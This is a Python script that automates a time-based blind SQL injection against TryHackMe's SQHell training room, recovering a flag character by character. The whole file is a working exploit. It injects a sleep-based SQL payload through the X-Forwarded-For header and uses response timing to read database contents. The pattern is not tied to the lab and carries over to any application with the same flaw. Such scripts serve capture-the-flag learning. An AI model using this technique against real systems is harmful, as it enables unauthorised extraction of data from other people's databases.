#!/usr/bin/env python3

import requests
import string
import time
import argparse

parser = argparse.ArgumentParser(description='A simple python script to automate time-based SQL injection for TryHackMe\'s SQHell room, Flag 2.')
parser.add_argument('-i', '--ip', help='The target IP or domain')
args = parser.parse_args()

url = f'http://{args.ip}/terms-and-conditions'
# From A-Z, 0-9, {}:
char = string.ascii_uppercase + string.digits + '{' + '}' + ':'
flag = ''
counter = 1

while True:
	for characters in char:
		header = {'X-Forwarded-For': f"'and (select sleep(3) from flag where SUBSTR(flag,{counter},1) = '{characters}')-- -"}

		start_time = int(time.time())
		requests.get(url, headers=header)
		end_time = int(time.time())

		if end_time - start_time >= 3:
			counter += 1
			flag += ''.join(characters)

			# Clean previous line
			print('\r', end='')
			print(f'Flag2 is: {flag}', end='')
			break

	if len(flag) >= 43:
		exit()